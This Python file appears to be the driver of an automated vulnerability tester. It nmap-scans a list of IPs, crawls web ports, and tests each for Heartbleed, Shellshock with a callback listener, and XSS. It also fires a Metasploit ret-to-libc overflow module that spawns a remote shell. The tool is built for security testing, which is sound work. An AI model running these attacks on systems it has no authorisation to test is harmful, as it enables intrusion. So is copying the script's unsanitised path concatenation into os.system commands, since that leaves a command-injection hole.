import nmap
import argparse
import os
import netifaces as ni

#Local files:
from json_parser import *
from crawler import *
from heartbleed import *
from shellshock import shellshock_listener, HOST_IP, HOST_PORT

TCP = 'tcp'
UDP = 'udp'

#global verbose
#verbose = False

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='An automated vulnerability testing tool.')

	parser.add_argument('-v', help='Verbose output.', dest = 'verbose', action='store_true')
	parser.add_argument('-p', help='Listening port for shellshock test.', dest = 'shellshock_port', type=int, required=True)
	parser.add_argument('-ip', help='(Optional, specify if IP is not found automatically.) Listening IP for shellshock test.', dest = 'shellshock_ip')
	parser.add_argument('--metasploit-path', help='Specify the path to metasploit.', dest = 'ms_path')
	parser.add_argument('--rvm-path', help='Path to ruby version manager.', dest = 'rvm_path')
	parser.add_argument('--ret-to-libc-port', help='Specify port to test for return to libc buffer overflow attack.', dest = 'rtolibc_port', type=int)
	args = parser.parse_args()

	if args.ms_path:
		print("Using ms_path: ", args.ms_path)
		os.system('/bin/bash -c \'cp msf_aux_modules/* ' + args.ms_path + '/modules/auxiliary/;\'')


	shellshock_tester = None
	if args.shellshock_ip:
		 shellshock_listener(args.shellshock_ip, args.shellshock_port, args.verbose)
	else:
		try:
			ni.ifaddresses('eth0')
			host_ip = ni.ifaddresses('eth0')[2][0]['addr']
			#print(host_ip)
		except:
			print("Getting IP failed, specify manually with '-ip'")
			exit(0)

		shellshock_tester = shellshock_listener(host_ip, args.shellshock_port, args.verbose)

	#If args.cgilist:
	cgi_file = open('cgi_list.txt', 'r')
	cgi_paths = []
	for line in cgi_file:
		path = line.split('\n')[0]
		if path is not "":	
			cgi_paths.append(path)

	ip_file = open('ip_list.txt', 'r')
	ip_addresses = []
	for line in ip_file:
		ip = line.split('\n')[0].split('#')[0].split(' ')[0]
		if ip is not "":
			ip_addresses.append(ip)

	ip_file.close()
	print(ip_addresses)

	json_data = json_object()
	nm = nmap.PortScanner()

	for ip in ip_addresses:

		print("Scanning " + str(ip))
		nm.scan(ip)#print() # contains info like downhosts = 1,0

		first_failed = False #@Todo: refactor
		try:
			protocols = nm[ip].all_protocols()
			if not nm[ip][TCP]:
				#json_data.add_host(nm[ip])
			#else:
				print("Note: Host " + ip + " seems down. Attempting to scan with different arguments.")
				first_failed = True

		except KeyError:
			print("Note: Host " + ip + " seems down. Attempting to scan with different arguments.")
			first_failed = True

		
		if first_failed:
			nm.scan(ip, arguments="-Pn")
			try:
				protocols = nm[ip].all_protocols()
				#if nm[ip][TCP]:
					#json_data.add_host(nm[ip])

			except KeyError:
				print("Host " + ip + " is not up.")
				#break;
			

		#for protocol in protocols:
		#	print(nm[ip][protocol].keys())

		if TCP in protocols:
			TCP_ports = nm[ip][TCP].keys()
			heartbleed_dict = {}
			links_dict = {}
			XSS_list = []
			shellshock_tester.clear()
			#vulnerable_shellshock_URLS = []
			for port in TCP_ports:
				state = nm[ip][TCP][port]['state']
				name = nm[ip][TCP][port]['name']
				product = nm[ip][TCP][port]['product']
				print("Working on port: " + str(port) + ", state: " + str(state) + ", name: " + str(name) + ", product: " + str(product))
				
				
				#@Todo: check for potential exploits
				if name == "http" or name == "http-alt" or port == 80 or port == 443 or port == 8080 or port == 8000:
					#@Todo: crawl checking for CGI/Input boxes, for shellshock, potential upload of code i.e. php
					url = 'http://' + ip + ':' + str(port)
					collected_links, form_dict = http_crawl(url, ip, False, None, verbose=args.verbose)

					#@Todo implement alternate URL list argument.
					for path in cgi_paths:
						url = 'http://' + ip + ':' + str(port) + path
						#print("Crawling additionally to: ", url)
						collected_links_additional, form_dict_additional = http_crawl(url, ip, False, collected_links, verbose=args.verbose)
						form_dict = merge_form_dicts(form_dict, form_dict_additional)
						collected_links = append_list_if_not_exist(collected_links, collected_links_additional)


					if form_dict and collected_links:
						# print("Collected links:")
						# print(collected_links)
						# print("Form dict:")
						# print(form_dict)
						# print(len(form_dict))
						# print(len(collected_links))
						#for link in list(form_dict.keys()):
							#if link not in collected_links:
								#print(link)

						links_dict[str(port)] = form_dict #@Todo: implement different ports properly in crawler!
						#assert len(form_dict) == len(collected_links)

					print("Testing " + ip + ":" + str(port) + " for Heartbleed.")

					#Test heartbleed
					heartbleed_vulnerable = heartbleed_test(ip, port)
					if heartbleed_vulnerable:
						print(ip + ":" + str(port) + " IS VULNERABLE TO HEARTBLEED!")
					
					heartbleed_dict[str(port)] = heartbleed_vulnerable

					print("Testing " + ip + ":" + str(port) + " for Shellshock.")

					#Test shellshock
					if form_dict:
						for URL in form_dict.keys():
								#if args.verbose:
									#print("Testing ", URL, " for Shellshock.")
							shellshock_tester.shellshock_test(URL)
							#print(shellshock_tester.vuln_list)


					print("Testing " + ip + ":" + str(port) + " for XSS.")

					#Test XSS:
					if form_dict:
						for URL in form_dict.keys():
							if form_dict[URL] == True:
								if args.verbose:
									print("Testing ", URL, " for XSS.")
								if form_parse(URL, ip, port):
									XSS_list.append(URL)

			if shellshock_tester.vuln_list != []:
				print(ip + " IS VULNERABLE TO SHELLSHOCK!")

			if XSS_list != []:
				print(ip + " IS VULNERABLE TO XSS!")

			nm[ip]['links'] = links_dict
			nm[ip]['heartbleed'] = heartbleed_dict
			nm[ip]['shellshock'] = shellshock_tester.vuln_list
			nm[ip]['XSS'] = XSS_list


		#Metasploit tests
		if args.ms_path and args.rvm_path and args.rtolibc_port:
			print("Using ms_path: ", args.ms_path)
			print("Using rvm_path: ", args.rvm_path)
			print("Using rtolibc_port: ", args.rtolibc_port)
			os.system('/bin/bash -c \'source ' + args.rvm_path + '/scripts/rvm;cd ' + args.ms_path + ';./msfconsole -x "use auxiliary/ret_to_libc_overflow; set RHOST ' + ip + ';set RPORT ' + str(args.rtolibc_port) + ';set execl_libc_address 0x000b4c60;set write_libc_address 0x000d92d0;set exit_immediately true;run;quit" > /tmp/msf_out\'')

			# if not nm[ip]:
			# 	nm[ip] = {}
			# 	np[ip]

			nm[ip]['ret_to_libc_overflow'] = False

			result_file = open('/tmp/msf_out', 'r')
			for line in result_file:
				if "Remote shell spawned successfully!" in line:
					print(ip + " IS VULNERABLE TO RETURN TO LIBC OVERFLOW ATTACK!")
					nm[ip]['ret_to_libc_overflow'] = args.rtolibc_port


		json_data.add_host(nm[ip])

	print("Done. Saving vulnerability data:")
	save_json(json_data.data, "results.json")


#print("Parsing json:")
#json_data_loaded = parse_json("save.json")
#print(json_data_loaded.data)

